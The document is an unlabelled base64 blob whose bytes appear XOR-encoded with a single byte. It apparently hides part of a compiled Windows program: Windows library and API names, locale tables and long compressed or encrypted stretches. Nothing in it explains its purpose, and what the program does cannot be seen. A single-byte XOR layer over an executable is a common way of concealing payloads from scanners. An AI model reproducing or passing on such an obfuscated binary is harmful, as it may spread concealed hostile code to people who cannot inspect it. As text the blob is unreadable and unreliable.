+F3oXchc6F3sXJhc6FyYXOhcmFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdxF34XexdyFzoXexcmFzoXJRc6FyUXFxcXFxcXFxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXexd4F3QXdhd7F34XbRd2F2MXfhd4F3kXOhd7FyYXOhclFzoXJhcXFxcXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhd7F3gXdBd2F3sXfhdtF3YXYxd+F3gXeRc6F3gXdRdkF3gXexdyF2MXchc6F3sXJhc6FyUXOhcnFxcXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdnF2UXeBd0F3IXZBdkF2MXfxdlF3IXdhdzF2QXOhd7FyYXOhcmFzoXJRcXFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F2QXYxdlF34XeRdwFzoXexcmFzoXJhc6FycXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3QXeBdlF3IXOhdkF24XZBd+F3kXcRd4FzoXexcmFzoXJRc6FyYXFxcXF3YXZxd+FzoXehdkFzoXYBd+F3kXOhd0F3gXZRdyFzoXYBd+F3kXZRdjFzoXexcmFzoXJhc6FycXFxcXFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXdBd4F2UXchc6F28XZBdjF3YXYxdyFzoXexclFzoXJhc6FycXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F2UXYxd0F3gXZRdyFzoXeRdjF2IXZBdyF2UXOhdgF34XeRdzF3gXYBc6F3sXJhc6FyYXOhcnFxcXFxd2F2cXfhc6F3oXZBc6F2AXfhd5FzoXZBdyF3QXYhdlF34XYxduFzoXZBduF2QXYxdyF3oXcRdiF3kXdBdjF34XeBd5F2QXOhd7FyYXOhcmFzoXJxcXFxcXFxcXFxcXFxdyF28XYxc6F3oXZBc6F2AXfhd5FzoXeRdjF2IXZBdyF2UXOhdzF34Xdhd7F3gXcBd1F3gXbxc6F3sXJhc6FyYXOhcnFxcXFxcXFxcXFxcXF3IXbxdjFzoXehdkFzoXYBd+F3kXOhd5F2MXYhdkF3IXZRc6F2AXfhd5F3MXeBdgF2QXYxd2F2MXfhd4F3kXOhd7FyYXOhcmFzoXJxcXFxcXdhdzF2EXdhdnF34XJBclFxcXFxcXFxcXeRdjF3MXexd7FxcXFxcXFxcXFxcXFxcXdhdnF34XOhd6F2QXOhdgF34XeRc6F3YXZxdnF3oXeBdzF3IXexc6F2UXYhd5F2MXfhd6F3IXOhd7FyYXOhcmFzoXJRcXFxcXYhdkF3IXZRckFyUXFxcXFxYXFxcHFxcXFhcXFwcXFxcWFxcXBxcXFxYXFxcHFxcXHxcXFxcXFxdQcmNEbmRjcnpDfnpyR2VydH5kclZkUX57ckN+enIXFxAXFxcHFxcXFBcXFwcXFxdbVFp2Z0RjZX55cFJvFxcXFBcXFwcXFxdbeHR2e3JZdnpyQ3hbVF5TFxcXFwUXFxdWZ2dHeHt+dG5QcmNHZXh0cmRkQ3Jlen55dmN+eHlacmN/eHMXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXNxc3FzcXNxc3FzcXNxc3FzcXPxc/Fz8XPxc/FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3F18XBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXkxeTF5MXkxeTF5MXkxeTF5MXkxcHFwcXBxcHFwcXBxcHF5YXlheWF5YXlheWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcHFwcXBxcHFwcXBxeVF5UXlReVF5UXlRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXBxcHFwcXBxc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc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eWVEXFxcmNEZZVlkXFyY0RFlWWRcXJjReWVMXFxdiF3wXFxcXF3QXdhc6F1IXRBcXFxcXFxd0F2QXOhdUF00XFxcXFxcXcxd2FzoXUxdcFxcXFxcXF3MXchc6F1MXUhcXFxcXFxdyF3sXOhdQF0UXFxcXFxcXcRd+FzoXURdeFxcXFxcXF3EXZRc6F1EXRRcXFxcXFxd/F3IXOhdeF1sXFxcXFxcXfxdiFzoXXxdCFxcXFxcXF34XZBc6F14XRBcXFxcXFxd+F2MXOhdeF0MXFxcXFxcXeRd7FzoXWRdbFxcXFxcXF3kXdRc6F1kXWBcXFxcXFxdnF3sXOhdHF1sXFxcXFxcXZxdjFzoXVRdFFxcXFxcXF2UXeBc6F0UXWBcXFxcXFxdlF2IXOhdFF0IXFxcXFxcXfxdlFzoXXxdFFxcXFxcXF2QXfBc6F0QXXBcXFxcXFxdkF2YXOhdWF1sXFxcXFxcXZBdhFzoXRBdSFxcXFxcXF2MXfxc6F0MXXxcXFxcXFxdjF2UXOhdDF0UXFxcXFxcXYhdlFzoXRxdcFxcXFxcXF34Xcxc6F14XUxcXFxcXFxdiF3wXOhdCF1YXFxcXFxcXdRdyFzoXVRdOFxcXFxcXF2QXexc6F0QXXhcXFxcXFxdyF2MXOhdSF1IXFxcXFxcXexdhFzoXWxdBFxcXFxcXF3sXYxc6F1sXQxcXFxcXFxdxF3YXOhdeF0UXFxcXFxcXYRd+FzoXQRdZFxcXFxcXF38Xbhc6F1YXWhcXFxcXFxd2F20XOhdWF00XOhdbF3YXYxd5FxcXFxdyF2IXOhdSF0QXFxcXFxcXehd8FzoXWhdcFxcXFxcXF2MXeRc6F00XVhcXFxcXFxdvF38XOhdNF1YXFxcXFxcXbRdiFzoXTRdWFxcXFxcXF3YXcRc6F00XVhcXFxcXFxd8F3YXOhdQF1IXFxcXFxcXcRd4FzoXURdYFxcXFxcXF38Xfhc6F14XWRcXFxcXFxd6F2MXOhdaF0MXFxcXFxcXZBdyFzoXWRdYFxcXFxcXF3oXZBc6F1oXThcXFxcXFxd8F3wXOhdcF00XFxcXFxcXfBduFzoXXBdQFxcXFxcXF2QXYBc6F1wXUhcXFxcXFxdiF20XOhdCF00XOhdbF3YXYxd5FxcXFxdjF2MXOhdFF0IXFxcXFxcXdRd5FzoXXhdZFxcXFxcXF2cXdhc6F14XWRcXFxcXFxdwF2IXOhdeF1kXFxcXFxcXYxd2FzoXXhdZFxcXFxcXF2MXchc6F14XWRcXFxcXFxd8F3kXOhdeF1kXFxcXFxcXehd7FzoXXhdZFxcXFxcXF3oXZRc6F14XWRcXFxcXFxdkF3YXOhdeF1kXFxcXFxcXehd5FzoXWhdZFxcXFxcXF3QXbhc6F1AXVRcXFxcXFxdwF3sXOhdSF0QXFxcXFxcXfBd4F3wXOhdeF1kXFxcXF2QXbhdlFzoXRBdOFxcXFxdzF34XYRc6F1oXQRcXFxcXZhdiF20XOhdVF1gXFxcXF3kXZBc6F00XVhcXFxcXFxd6F34XOhdZF00XFxcXFxcXdhdlFzoXXhdGFxcXFxcXF3MXchc6F1QXXxcXFxcXFxdyF3kXOhdQF1UXFxcXFxcXchdkFzoXWhdPFxcXFxcXF3EXZRc6F1UXUhcXFxcXFxd+F2MXOhdUF18XFxcXFxcXeRd7FzoXVRdSFxcXFxcXF3kXeRc6F1kXWBcXFxcXFxdnF2MXOhdHF0MXFxcXFxcXZBdlFzoXRBdHFzoXWxd2F2MXeRcXFxcXZBdhFzoXURdeFxcXFxcXF3YXbRc6F1YXTRc6F1QXbhdlF3sXFxcXF2QXchc6F0QXUhcXFxcXFxd6F2QXOhdVF1kXFxcXFxcXYhdtFzoXQhdNFzoXVBduF2UXexcXFxcXZhdiF20XOhdSF1QXFxcXF3YXZRc6F1IXUBcXFxcXFxdtF38XOhdfF1wXFxcXFxcXcxdyFzoXVhdDFxcXFxcXF3IXeRc6F1YXQhcXFxcXFxdyF2QXOhdSF0QXFxcXFxcXcRdlFzoXVBdWFxcXFxcXF2QXZRc6F0QXRxc6F1QXbhdlF3sXFxcXF2QXchc6F1EXXhcXFxcXFxdmF2IXbRc6F0cXUhcXFxcXdhdlFzoXWxdOFxcXFxcXF20Xfxc6F0QXUBcXFxcXFxdzF3IXOhdbF0IXFxcXFxcXchd5FzoXVBdWFxcXFxcXF3IXZBc6F1AXQxcXFxcXFxdxF2UXOhdUF18XFxcXFxcXfxdlFzoXVRdWFxcXFxcXF2QXehd9FzoXWRdYFxcXFxd2F2UXOhdTF00XFxcXFxcXbRd/FzoXWhdYFxcXFxcXF3MXchc6F1sXXhcXFxcXFxdyF3kXOhdZF00XFxcXFxcXchdkFzoXVBdFFxcXFxcXF3EXZRc6F1sXQhcXFxcXFxd1F2QXOhdVF1YXOhdbF3YXYxd5FxcXFxdkF3oXfRc6F0QXUhcXFxcXdhdlFzoXWhdWFxcXFxcXF3IXeRc6F14XUhcXFxcXFxdyF2QXOhdHF1YXFxcXFxcXcRdlFzoXWhdUFxcXFxcXF2QXZRc6F1UXVhc6F1sXdhdjF3kXFxcXF2QXehd2FzoXWRdYFxcXFxd2F2UXOhdDF1kXFxcXFxcXchd5FzoXTRdWFxcXFxcXF3IXZBc6F1MXWBcXFxcXFxdkF2UXOhdVF1YXOhdUF24XZRd7FxcXFxdkF3oXdhc6F0QXUhcXFxcXdhdlFzoXWBdaFxcXFxcXF3IXeRc6F10XWhcXFxcXFxdyF2QXOhdBF1IXFxcXFxcXZBd6F2QXOhdRF14XFxcXF3YXZRc6F04XUhcXFxcXFxdyF3kXOhdUF1UXFxcXFxcXchdkFzoXVBdYFxcXFxcXF2QXehd5FzoXURdeFxcXFxd2F2UXOhdEF04XFxcXFxcXchd5FzoXVRdNFxcXFxcXF3IXZBc6F0cXUhcXFxcXFxd2F2UXOhddF1gXFxcXFxcXchd5FzoXQxdDFxcXFxcXF3IXZBc6F1YXRRcXFxcXFxd2F2UXOhdbF1UXFxcXFxcXchd5FzoXTRdAFxcXFxcXF3IXZBc6F1IXVBcXFxcXFxd2F2UXOhdcF0AXFxcXFxcXchd5FzoXRxdfFxcXFxcXF3IXZBc6F1QXWxcXFxcXFxd2F2UXOhdWF1IXFxcXFxcXchdkFzoXQhdOFxcXFxcXF3YXZRc6F1UXXxcXFxcXFxdyF2QXOhdHF04XFxcXFxcXdhdlFzoXRhdWFxcXFxcXF3IXZBc6F1UXWBcXFxcXFxdyF2QXOhdEF0EXFxcXFxcXchdkFzoXXxdZFxcXFxcXF3IXZBc6F1kXXhcXFxcXFxdyF2QXOhdHF0UXFxcXFxcXbRd/FzoXVBdfF0MXFxcXF2QXZRcXFxcXFxcXFxcXFxd3ZRWXFhcXF1UXFxcXFxcXp2YVlxYXFxc7FxcXFxcXF6dAFZcWFxcXZhcXFxcXFxdHZxWXFhcXFxcXFxcXFxcX10AVlxYXFxfPFxcXFxcXF8dAFZcWFxcXzRcXFxcXFxf3QBWXFhcXF6YXFxcXFxcX50AVlxYXFxe3FxcXFxcXFxdPFZcWFxcXmBcXFxcXFxcHTxWXFhcXF9gXFxcXFxcXN08VlxYXFxfCFxcXFxcXFydPFZcWFxcXxRcXFxcXFxdXTxWXFhcXF74XFxcXFxcXR08VlxYXFxeuFxcXFxcXF3dPFZcWFxcX0xcXFxcXFxdnTxWXFhcXF8sXFxcXFxcXl08VlxYXFxdUFxcXFxcXF4dPFZcWFxcX2xcXFxcXFxe3TxWXFhcXF6gXFxcXFxcXp08VlxYXFxffFxcXFxcXF49mFZcWFxcXPhcXFxcXFxfXTxWXFhcXF4wXFxcXFxcXz08VlxYXFxd8FxcXFxcXF09mFZcWFxcXNhcXFxcXFxfnTxWXFhcXF3QXFxcXFxcXT2cVlxYXFxcWFxcXFxcXFxdOFZcWFxcXUxcXFxcXFxcHThWXFhcXF2oXFxcXFxcXN04VlxYXFxegFxcXFxcXF3dnFZcWFxcXFRcXFxcXFxcvThWXFhcXF1IXFxcXFxcXb2cVlxYXFxcTFxcXFxcXF19OFZcWFxcXUBcXFxcXFxdPThWXFhcXF5AXFxcXFxcXl2cVlxYXFxcSFxcXFxcXF39OFZcWFxcXXxcXFxcXFxefZxWXFhcXFxEXFxcXFxcXb04VlxYXFxe1FxcXFxcXF59OFZcWFxcXhhcXFxcXFxePThWXFhcXF14XFxcXFxcXv04VlxYXFxekFxcXFxcXF69OFZcWFxcXvBcXFxcXFxdPZRWXFhcXF1YXFxcXFxcX304VlxYXFxecFxcXFxcXF4dnFZcWFxcXEBcXFxcXFxfPThWXFhcXF10XFxcXFxcXj2cVlxYXFxcfFxcXFxcXF/9OFZcWFxcXtBcXFxcXFxfvThWXFhcXF9oXFxcXFxcXH00VlxYXFxe7FxcXFxcXFw9NFZcWFxcX3hcXFxcXFxc/TRWXFhcXF4UXFxcXFxcXL00VlxYXFxetFxcXFxcXF19NFZcWFxcX0hcXFxcXFxdPTRWXFhcXF6MXFxcXFxcXf00VlxYXFxfBFxcXFxcXF29NFZcWFxcXxxcXFxcXFxefTRWXFhcXF1wXFxcXFxcXj00VlxYXFxfXFxcXFxcXF79NFZcWFxcXxBcXFxcXFxe3ZxWXFhcXFx4XFxcXFxcXr00VlxYXFxfGFxcXFxcXF99NFZcWFxcXyhcXFxcXFxfPTRWXFhcXF8AXFxcXFxcX/00VlxYXFxfdFxcXFxcXF+9NFZcWFxcXohcXFxcXFxcfTBWXFhcXF9YXFxcXFxcXD0wVlxYXFxfDFxcXFxcXFz9MFZcWFxcXsxcXFxcXFxcvTBWXFhcXF7oXFxcXFxcXX0wVlxYXFxfIFxcXFxcXF09MFZcWFxcXhBcXFxcXFxd/TBWXFhcXF/cXFxcXFxcXb0wVlxYXFxesFxcXFxcXF59MFZcWFxcX2RcXFxcXFxePTBWXFhcXF/YXFxcXFxcXv0wVlxYXFxfMFxcXFxcXF69MFZcWFxcXyRcXFxcXFxffTBWXFhcXF84XFxcXFxcXz0wVlxYXFxfRFxcXFxcXF39mFZcWFxcXNBcXFxcXFxf/TBWXFhcXF3IXFxcXFxcXt2YVlxYXFxc9FxcXFxcXF+9MFZcWFxcXexcXFxcXFxeXZhWXFhcXFzEXFxcXFxcXH0sVlxYXFxd/FxcXFxcXF79nFZcWFxcXHRcXFxcXFxcPSxWXFhcXF1sXFxcXFxcX12YVlxYXFxc5FxcXFxcXFz9LFZcWFxcXZBcXFxcXFxenZxWXFhcXFxwXFxcXFxcXL0sVlxYXFxeDFxcXFxcXF19LFZcWFxcXshcXFxcXFxdPSxWXFhcXF7kXFxcXFxcXf0sVlxYXFxdaFxcXFxcXF29LFZcWFxcXoRcXFxcXFxefSxWXFhcXF6sXFxcXFxcXV2UVlxYXFxcpFxcXFxcXF49LFZcWFxcXnxcXFxcXFxcfZRWXFhcXFyAXFxcXFxcXv0sVlxYXFxdoFxcXFxcXF69nFZcWFxcXGxcXFxcXFxevSxWXFhcXF1kXFxcXFxcX32YVlxYXFxc4FxcXFxcXF99LFZcWFxcXYxcXFxcXFxcPZhWXFhcXFw8XFxcXFxcXz0sVlxYXFxe4FxcXFxcXF/9LFZcWFxcXTRcXFxcXFxfXZxWXFhcXFxoXFxcXFxcX70sVlxYXFxdYFxcXFxcXF4dmFZcWFxcXPxcXFxcXFxcfShWXFhcXF30XFxcXFxcXR2YVlxYXFxcIFxcXFxcXFw9KFZcWFxcXdhcXFxcXFxffZxWXFhcXFxkXFxcXFxcXP0oVlxYXFxdHFxcXFxcXF8dnFZcWFxcXGBcXFxcXFxcvShWXFhcXF4IXFxcXFxcXX0oVlxYXFxdGFxcXFxcXF89nFZcWFxcXBxcXFxcXFxdPShWXFhcXF0UXFxcXFxcXr2YVlxYXFxc6FxcXFxcXF39KFZcWFxcXZRcXFxcXFxfPZhWXFhcXFyYXFxcXFxcXb0oVlxYXFxdvFxcXFxcXFzdlFZcWFxcXLRcXFxcXFxefShWXFhcXF5UXFxcXFxcX92cVlxYXFxcGFxcXFxcXF19lFZcWFxcXKBcXFxcXFxePShWXFhcXF54XFxcXFxcXv0oVlxYXFxdEFxcXFxcXF/dmFZcWFxcXJRcXFxcXFxevShWXFhcXF24XFxcXFxcXb2YVlxYXFxcyFxcXFxcXF99KFZcWFxcXcBcXFxcXFxdnZhWXFhcXFzMXFxcXFxcXz0oVlxYXFxdxFxcXFxcXF/9KFZcWFxcXmRcXFxcXFxe/ZhWXFhcXFzwXFxcXFxcX70oVlxYXFxd6FxcXFxcXFx9JFZcWFxcXlBcXFxcXFxcvZRWXFhcXFyoXFxcXFxcXD0kVlxYXFxeRFxcXFxcXFz9lFZcWFxcXLBcXFxcXFxc/SRWXFhcXF5MXFxcXFxcXx2YVlxYXFxcnFxcXFxcXFy9JFZcWFxcXihcXFxcXFxdfSRWXFhcXF2AXFxcXFxcXT0kVlxYXFxdiFxcXFxcXF39JFZcWFxcXQhcXFxcXFxf/ZxWXFhcXFwUXFxcXFxcXb0kVlxYXFxeBFxcXFxcXF59JFZcWFxcXQxcXFxcXFxePSRWXFhcXF4AXFxcXFxcX52cVlxYXFxcEFxcXFxcXF79JFZcWFxcXmhcXFxcXFxcXZRWXFhcXFyEXFxcXFxcXr0kVlxYXFxdpFxcXFxcXF+9nFZcWFxcXAxcXFxcXFxffSRWXFhcXF0EXFxcXFxcXF2YVlxYXFxcCFxcXFxcXF89JFZcWFxcXQBcXFxcXFxf/SRWXFhcXF48XFxcXFxcX70kVlxYXFxebFxcXFxcXFx9IFZcWFxcXiBcXFxcXFxcPSBWXFhcXF78XFxcXFxcXH2YVlxYXFxcBFxcXFxcXFz9IFZcWFxcXTxcXFxcXFxcHZhWXFhcXFwAXFxcXFxcXL0gVlxYXFxdOFxcXFxcXFydlFZcWFxcXKxcXFxcXFxdfSBWXFhcXF5IXFxcXFxcXT0gVlxYXFxewFxcXFxcXF39IFZcWFxcXYRcXFxcXFxdvSBWXFhcXF4sXFxcXFxcXN2YVlxYXFxcOFxcXFxcXF59IFZcWFxcXTBcXFxcXFxd3ZhWXFhcXFzUXFxcXFxcXj0gVlxYXFxdzFxcXFxcXF79IFZcWFxcXqRcXFxcXFxevSBWXFhcXF9QXFxcXFxcX30gVlxYXFxenFxcXFxcXF89IFZcWFxcXrxcXFxcXFxf/SBWXFhcXF9wXFxcXFxcX70gVlxYXFxfQFxcXFxcXFz9mFZcWFxcXDRcXFxcXFxcfdxWXFhcXF0sXFxcXFxcXd14VlxYXFxf0FxcXFxcXFw93FZcWFxcX1RcXFxcXFxcndxWXFhcXF6oXFxcXFxcXX3cVlxYXFxexFxcXFxcXF3d3FZcWFxcXjhcXFxcXFxcnZhWXFhcXFwwXFxcXFxcXb3cVlxYXFxeNFxcXFxcXF593FZcWFxcXShcXFxcXFxf/ZhWXFhcXFyQXFxcXFxcXj3cVlxYXFxdtFxcXFxcXF0dlFZcWFxcXVxcXFxcXFxe/dxWXFhcXF50XFxcXFxcXB2UVlxYXFxcvFxcXFxcXF693FZcWFxcXlxcXFxcXFxcPZRWXFhcXFy4XFxcXFxcX33cVlxYXFxeWFxcXFxcXFy9mFZcWFxcXCxcXFxcXFxfPdxWXFhcXF0kXFxcXFxcX/3cVlxYXFxd5FxcXFxcXF1dmFZcWFxcXChcXFxcXFxfvdxWXFhcXF0gXFxcXFxcX72YVlxYXFxciFxcXFxcXFx92FZcWFxcXaxcXFxcXFxeXKBWXFhcXFzcXFxcXFxcXD3YVlxYXFxd1FxcXFxcXF19mFZcWFxcXCRcXFxcXFxc/dhWXFhcXF3cXFxcXFxcX52YVlxYXFxcjFxcXFxcXFy92FZcWFxcXiRcXFxcXFxdHdhWXFhcXF2wXFxcXFxcXn2YVlxYXFxcwFxcXFxcXF392FZcWFxcXfhcXFxcXFxdvdhWXFhcXF3gXFxcXFxcXn3YVlxYXFxcUFxcXFxcXF492FZcWFxcX9RcXFxcXFxe/dhWXFhcXF4cXFxcXFxcXr3YVlxYXFxe2FxcXFxcXF992FZcWFxcXpRcXFxcXFxfPdhWXFhcXF70XFxcXFxcX/3YV